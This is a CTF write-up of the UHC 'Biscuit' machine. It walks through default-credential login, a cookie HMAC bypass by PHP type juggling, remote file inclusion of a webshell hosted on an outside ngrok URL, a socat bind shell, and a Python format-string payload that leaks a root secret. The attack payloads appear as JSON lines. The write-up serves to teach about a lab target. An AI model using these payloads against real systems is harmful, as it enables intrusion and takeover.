---
layout: article
title:  "UHCCTF (Classificatória) - Biscuit (Official Write-Up) - eng"
tags: eng ctf
---
 

Hello, I'm Vinicius (big0us), this is a write-up of a machine that was the challenge for one of UHC's qualifiers. (translate to english by [0day](https://twitter.com/0dayctf))
Happy reading :)
g00d_h4ck1ng

# Recon

![/assets/biscuit/Untitled.png](/assets/biscuit/Untitled.png)

The first page you're greeted with a login page, taking a look at the HTML of the page, apparently there's
nothing hidden, I'll fuzz first, then we can test some credentials.

![/assets/biscuit/Untitled%201.png](/assets/biscuit/Untitled%201.png)

Apparently our fuzzing only showed a /class, where there is a directory listing pointing
to a ".php" file.

![/assets/biscuit/Untitled%202.png](/assets/biscuit/Untitled%202.png)

Okay, let's test some default credentials in the login form:

```
admin:admin
guest:guest
administrator:admin
root:root
```

By testing "guest:guest" we were able to enter:

![/assets/biscuit/Untitled%203.png](/assets/biscuit/Untitled%203.png)

Looking around apparently, we only have a welcome page.
Let's check our cookies.

![/assets/biscuit/Untitled%204.png](/assets/biscuit/Untitled%204.png)

![/assets/biscuit/Untitled%205.png](/assets/biscuit/Untitled%205.png)

Using cyberchef to decode the cookie, we can see that it's JSON with three values:
hmac (probably something that validates the values), username, and a time for the
cookie to expire.

I'm going to try to change the username value in the cookie to "admin" with base64 & URL encoding, and
then send back to the application.

![/assets/biscuit/Untitled%206.png](/assets/biscuit/Untitled%206.png)

This page showed an error saying that we're trying to do "cookie tampering", and
returned a flag! The first flag.
After some tests, sending cookies with other random values, I realized that
the application validates the cookie by the value of hmac, and not by the entire content
of json.
A well-known vulnerability about PHP validations is type-juggling, which consists of
bypassing authentications by making any if($ == $) that will always return "true".

[PHP Tricks (SPA)](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp)

[PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

![/assets/biscuit/Untitled%207.png](/assets/biscuit/Untitled%207.png)

Basically when a programmer uses "==" in a php comparison, first it makes the two values
the same type, ignoring the type (int, str...) of the variables.
And in this situation we can use some techniques for the comparison to return "true".

# Exploitation

After trying for quite a while, I tried changing the value of "hmac" to "true" and luckily it
worked!

![/assets/biscuit/Untitled%208.png](/assets/biscuit/Untitled%208.png)

```json
{"hmac":true,"username":"admin","expiration":1625435484}
```

![/assets/biscuit/Untitled%209.png](/assets/biscuit/Untitled%209.png)

Okay :( I was sad that there are no flags here.
I'll try to change the username again, to understand what's going on.

Changing to "test", php gives us an error, it seems it's running a "require_once" on
the value we put & appending ".php" at the end. require_once is normally used to include
pages and php files in websites, and when the user has control over the value that
require_once uses, the application is vulnerable to LFI or RFI (Local/Remote File
Inclusion).

![/assets/biscuit/Untitled%2010.png](/assets/biscuit/Untitled%2010.png)

As the application already puts the .php at the end, I will do the following.
Upload a file with a webshell on a server using ngrok, then tell the application to include my
file and get an RCE.

![/assets/biscuit/Untitled%2011.png](/assets/biscuit/Untitled%2011.png)

And I will send the payload:

```json
{"hmac":true,"username":"https://3b4f8afabab2.ngrok.io/shell","expiration":1625435484}
```

(The application now puts the .php)

We have RCE!!

![/assets/biscuit/Untitled%2012.png](/assets/biscuit/Untitled%2012.png)

Now I'm going to try to get a reverse shell.
After a few attempts I realized that there is a firewall in the application that blocks any
communication on ports other than 80 or 443, since I don't have a VPS, I'll do it differently, instead of a reverse shell (where the victim connects back to me) I'm going to use a bind shell (opening a port on the machine and connecting to it). For this I will use "socat".

[socat | GTFOBins](https://gtfobins.github.io/gtfobins/socat/#bind-shell)

![/assets/biscuit/Untitled%2013.png](/assets/biscuit/Untitled%2013.png)

First I got the socat binary in their github (socat binary) and passed it to the machine
using the web-server that I created to get RCE, and curling it.
I ran the commands that are in the image and got a bind shell! (I used port 6969)

![/assets/biscuit/Untitled%2014.png](/assets/biscuit/Untitled%2014.png)

In "/" have our next flag:

![/assets/biscuit/Untitled%2015.png](/assets/biscuit/Untitled%2015.png)

# Post Exploitation

Doing the basic privesc checklist, we can see that we are the apache user and we
can run a script as root on the machine:

![/assets/biscuit/Untitled%2016.png](/assets/biscuit/Untitled%2016.png)

Apparently we can't read the script or change it.

![/assets/biscuit/Untitled%2017.png](/assets/biscuit/Untitled%2017.png)

What's left for us to do, is to simply RUN IT!:

![/assets/biscuit/Untitled%2018.png](/assets/biscuit/Untitled%2018.png)

The file prints an IP with option 2 (List Blocked IP's), taking a look at /var/www/html the web application path, we
can see that there is a file with the same IP that was printed, so it's printing the IP that is in the file.

![/assets/biscuit/Untitled%2019.png](/assets/biscuit/Untitled%2019.png)

I opened the file with nano (before running 'export TERM=xterm' !!) and started editing
it, to try and provoke some type of error in python that would show me something from the
program.

![/assets/biscuit/Untitled%2020.png](/assets/biscuit/Untitled%2020.png)

![/assets/biscuit/Untitled%2021.png](/assets/biscuit/Untitled%2021.png)

Interestingly, there is a different (not used often) format string running.
Searching about this type of format string + vulnerabilites, I ended up stumbling on this
article.

[Are there any Security Concerns to using Python F Strings with User Input](https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input)

Basically it explains everything we need to do, so I won't explain it again, but
the way this format string works, allows us to inject more strings to be formatted, and if
this is printed we can print all the global variables that the file uses, usually giving us
some key or password.

Okay here is my final payload.

```json
{"ips":["{ip.list_blocked.__globals__}"]}
```

![/assets/biscuit/Untitled%2022.png](/assets/biscuit/Untitled%2022.png)

This worked and we got the value of a variable called root_secret, it's probably
the root password.

![/assets/biscuit/Untitled%2023.png](/assets/biscuit/Untitled%2023.png)

Worked!!
Thanks to you who've read this far, I hope you enjoyed this challenge / writeup!